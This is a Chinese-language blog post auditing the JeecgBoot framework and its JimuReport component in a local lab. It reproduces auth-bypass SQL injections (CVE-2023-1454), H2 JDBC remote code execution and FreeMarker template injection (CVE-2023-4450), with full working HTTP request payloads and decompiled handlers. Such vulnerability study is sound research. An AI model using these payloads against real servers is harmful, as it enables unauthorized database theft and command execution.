---
title: jeecgboot审计
tags:
  - 框架审计
  - java安全
date: 2025-08-19
---

我这边装的是3.5的。这个搭建起来算是比较简单的redis，mysql，然后pom导入一下就可以了。
前端的话直接去下面这个项目里面下载
https://github.com/jeecgboot/JeecgBoot

# 3.0 sql注入
这个漏洞的版本就早了，主要是鉴权部分的绕过其实还是非常有意思的
https://xz.aliyun.com/news/12632
poc大致如下
http://localhost:8080/jeecg-boot/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js
我看3.5这个版本的源码的话这个文件里面的内容全部都已经注释掉了。但是取消注释就可以用上面的poc进行复现了。可能开发者都不知道这些代码到底哪里来的。
`jeecg-module-system\jeecg-system-biz\src\main\java\org\jeecg\modules\ngalain\controller\NgAlainController.java`
对应的mapper在这里面。问了gpt这是 mybatis 的产物。
`jeecg-module-system\jeecg-system-biz\src\main\java\org\jeecg\modules\system\mapper\SysDictMapper.java`
shiro相关的配置就是在这里进行的。
`jeecg-boot-base-core\src\main\java\org\jeecg\config\shiro\ShiroConfig.java`
```java
        filterChainDefinitionMap.put("/**/*.js", "anon");   // 这个js也就是后面哪个x.js的由来。
        filterChainDefinitionMap.put("/**/*.css", "anon");
        filterChainDefinitionMap.put("/**/*.html", "anon");
```
修复的话这里面有提到，说白了就是注释掉有漏洞的代码
https://blog.csdn.net/qq_40032778/article/details/131784804

# 3.5sql注入
这里这个3.5的漏洞，poc已经贴过了。CVE-2023-1454
https://www.cnblogs.com/hetianlab/p/17560744.html
```
POST /jeecg-boot/jmreport/qurestSql HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: 127.0.0.1
Content-Type: application/json
Content-Length: 126


{"apiSelectId":"1316997232402231298","id":"1' or '%1%' like (updatexml(0x3a,concat(1,(SELECT password from sys_user where username = 'admin')),1)) or '%%' like '"}
```
## 分析
本质上还是没有做鉴权。
```
//积木报表排除
filterChainDefinitionMap.put("/jmreport/**", "anon");
filterChainDefinitionMap.put("/**/*.js.map", "anon");
filterChainDefinitionMap.put("/**/*.css.map", "anon");
```

分析了半天也没有找到这个路由，也不知道对应的代码在哪里。
https://github.com/jeecgboot/JeecgBoot/commit/44952c79c244a998e3904e44cea47baab0ee681b#diff-47360974c82629d690b86a8a39ab4aec3ed52986a6b8fca080bb0666af0d85da
后来发现其实是积木报表的锅
jimureport-spring-boot-starter-1.5.6\org\jeecg\modules\jmreport\desreport\a\a.java
```java
@PostMapping({"/qurestSql"})
public Result<?> b(@RequestBody JSONObject var1, HttpServletRequest var2) {
  String var3 = var1.getString("apiSelectId");
  var1.remove("apiSelectId");
  JmReportDb var4 = this.reportDbService.getById(var3);
  List var5 = this.reportDbService.qurestechSql(var4, var1);
  this.jmReportDesignService.replaceDbCode(var4, var5);
  return Result.OK(org.jeecg.modules.jmreport.desreport.util.e.b(var5));
}
```
我跟了半天实在是看不明白。但是我找到了官方的二次开发文档。像是积木报表自带的简化版 MyBatis
https://help.jimureport.com/secondaryDevelopment

这就是 MyBatis 的感觉
`jeecg-module-system\jeecg-system-biz\src\main\java\org\jeecg\modules\system\mapper\SysDictMapper.java`
```
    /**
     * 通过查询指定table的 text code 获取字典
     * @param table
     * @param key
     * @param value
     * @return List<Map<String,String>>
     */
	@Deprecated
	@Select("select ${key} as \"label\",${value} as \"value\" from ${table}")
	public List<Map<String,String>> getDictByTableNgAlain(@Param("table") String table, @Param("key") String key, @Param("value") String value);
```
# JDBC
https://1oecho.github.io/KHsGtk94v/
这个地方的话记得加一下h2的依赖。
```xml
		<dependency>
			<groupId>mysql</groupId>
			<artifactId>mysql-connector-java</artifactId>
			<version>${mysql-connector-java.version}</version>
			<scope>runtime</scope>
		</dependency>

		<dependency>
			<groupId>com.h2database</groupId>
			<artifactId>h2</artifactId>
			<version>2.2.224</version>
		</dependency>
```
然后poc是这样的。
```
POST /jeecg-boot/jmreport/testConnection HTTP/1.1
Host: 192.168.58.1:8080
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Content-Type: application/json;charset=UTF-8

{"dbType":"H2","dbDriver":"org.h2.Driver","dbUrl":"jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\n java.lang.Runtime.getRuntime().exec('calc')$$","dbUsername":"jeecgbootbpm","dbPassword":"jeecg196283"}
```

## 分析
路径如下
jimureport-spring-boot-starter-1.5.6\org\jeecg\modules\jmreport\desreport\a\a.java
感觉真的没有什么好说的，就慢慢的去分析然后一个一个去传参数就可以了。
```java
   @PostMapping({"/testConnection"})
   public Result a(@RequestBody JmreportDynamicDataSourceVo var1) {
      Connection var2 = null;
      String var3 = var1.toString();
      a.info(" local cache key: " + var3);
      Object var4 = this.localCache.a(var3);
      if (org.jeecg.modules.jmreport.common.b.g.d(var4)) {
         int var5 = org.jeecg.modules.jmreport.common.b.g.e(var4);
         a.info(" local cache value: " + var5);
         if (var5 >= 3) {
            return Result.error("数据源已连接错误3次以上,请检查配置信息！");
         }
         if (var5 == 0) {
            return Result.OK("数据库连接成功", true);
         }
      } else {
         this.localCache.a(var3, 0, 3600000L);
      }

      Result var7;
      try {
         String var37 = var1.getDbType();
         if (!this.jmReportDbSourceService.isHave(org.jeecg.modules.jmreport.common.constant.c.cI, var37)) {
            Class.forName(var1.getDbDriver());
            DriverManager.setLoginTimeout(60);
            String var40 = org.jeecg.modules.jmreport.dyndb.util.b.g(var1.getDbUrl());
            var2 = DriverManager.getConnection(var40, var1.getDbUsername(), var1.getDbPassword());
            if (var2 == null) {
               this.localCache.a(var3, 1);
               var7 = Result.OK("数据库连接失败：错误未知", true);
               return var7;
            }

            Driver var42 = DriverManager.getDriver(var40);
            String var8 = var42.getClass().getName();
            String var9 = "org.mariadb.jdbc.Driver";
            String var10 = "com.mysql.cj.jdbc.Driver";
            String var11 = "com.mysql.jdbc.Driver";
            String var12 = "MARIADB";
            String var13 = "MYSQL5.5";
            String var14 = "MYSQL5.7";
            if (var9.equals(var8)) {
               if (var14.equals(var1.getDbType().toUpperCase()) && !var10.equals(var1.getDbDriver())) {
                  this.localCache.a(var3, 1);
                  Result var45 = Result.OK("数据库连接成功,数据库驱动可能不正确", false);
                  return var45;
               }

               if (var13.equals(var1.getDbType().toUpperCase()) && !var11.equals(var1.getDbDriver())) {
                  this.localCache.a(var3, 1);
                  Result var44 = Result.OK("数据库连接成功,数据库驱动可能不正确", false);
                  return var44;
               }

               if (var12.equals(var1.getDbType().toUpperCase()) && !var9.equals(var1.getDbDriver())) {
                  this.localCache.a(var3, 1);
                  Result var15 = Result.OK("数据库连接成功,数据库驱动可能不正确", false);
                  return var15;
               }
            } else if (!var8.equals(var1.getDbDriver())) {
               this.localCache.a(var3, 1);
               Result var47 = Result.OK("数据库连接成功,数据库驱动可能不正确", false);
               return var47;
            }

            Result var46 = Result.OK("数据库连接成功", true);
            return var46;
         }

         boolean var39 = this.jmreportNoSqlService.testConnection(var1);
         if (!var39) {
            this.localCache.a(var3, 1);
            var7 = Result.error("数据库连接失败：错误未知");
            return var7;
         }

         var7 = Result.OK("数据库连接成功", true);
      } catch (ClassNotFoundException var34) {
         a.error(var34.toString(), var34);
         this.localCache.a(var3, 1);
         Result var38 = Result.error("数据库连接失败：驱动类不存在");
         return var38;
      } catch (Exception var35) {
         a.error(var35.toString(), var35);
         this.localCache.a(var3, 1);
         Result var6 = Result.error("数据库连接失败：" + var35.getMessage());
         return var6;
      } finally {
         try {
            if (var2 != null && !var2.isClosed()) {
               var2.close();
            }
         } catch (SQLException var33) {
            a.error(var33.toString(), var33);
         }

      }

      return var7;
   }
```

# CVE-2023-4450(10分)
https://avd.aliyun.com/detail?id=AVD-2023-1678778
https://xz.aliyun.com/news/12670
JimuReport < 1.6.1

```
POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
Host: 192.168.58.1:8080
Referer: http://192.168.58.1:8080/jeecg-boot/jmreport/queryFieldBySql
Pragma: no-cache
Cache-Control: no-cache
Origin: http://192.168.58.1:8080
Content-Type: application/json
Accept-Encoding: gzip, deflate
Cookie: connect.sid=s%3A6loLwmQjHx7NdPkfg15JeltRMjQsaTgU.ThPaYWVGj13BlprRCSW%2BzBXYnGzQLjrThHE%2FlLWUB1U
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Content-Length: 100

{"sql":"select '<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"whoami\") }' "}

```
具体堆栈如下
```
a:103, FreeMarkerUtils (org.jeecg.modules.jmreport.desreport.render.utils)
a:1147, e (org.jeecg.modules.jmreport.desreport.util)
a:289, e (org.jeecg.modules.jmreport.desreport.util)
parseReportSql:690, i (org.jeecg.modules.jmreport.desreport.service.a)
invoke:-1, i$$FastClassBySpringCGLIB$$4daca655 (org.jeecg.modules.jmreport.desreport.service.a)
invoke:218, MethodProxy (org.springframework.cglib.proxy)
invokeMethod:386, CglibAopProxy (org.springframework.aop.framework)
access$000:85, CglibAopProxy (org.springframework.aop.framework)
intercept:704, CglibAopProxy$DynamicAdvisedInterceptor (org.springframework.aop.framework)
parseReportSql:-1, i$$EnhancerBySpringCGLIB$$a768ed45 (org.jeecg.modules.jmreport.desreport.service.a)
c:808, a (org.jeecg.modules.jmreport.desreport.a)
```
具体的触发点在 这里的 var0 就是
 `<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"whoami\") }'`
`(new Template("template", new StringReader(var0), var2)).process(var1, var3);`

同时这里不光有freemarker的rce，还有sql注入点，可以直接未授权执行sql语句。
freemarker 又是apache的一个项目。 
其实积木报表和Freemarker的star数不算多，但是jeecg在用它并且star很多。
freemarker 其实star不多，但是这是一个很好的新的sink点。
# else
其实好多问题就是出现在积木报表这里。 但是我有点懒得折腾去看它是怎么修复的了。
https://xz.aliyun.com/news/17738
暂时就先看这几个漏洞吧

# 小结
其实这几个洞也都看的7788了，但是我还是对这个框架十分的陌生。里面很多的技术细节我也根本就不懂。还有微服务这块我也挺感兴趣的。以后有机会一定学，一定。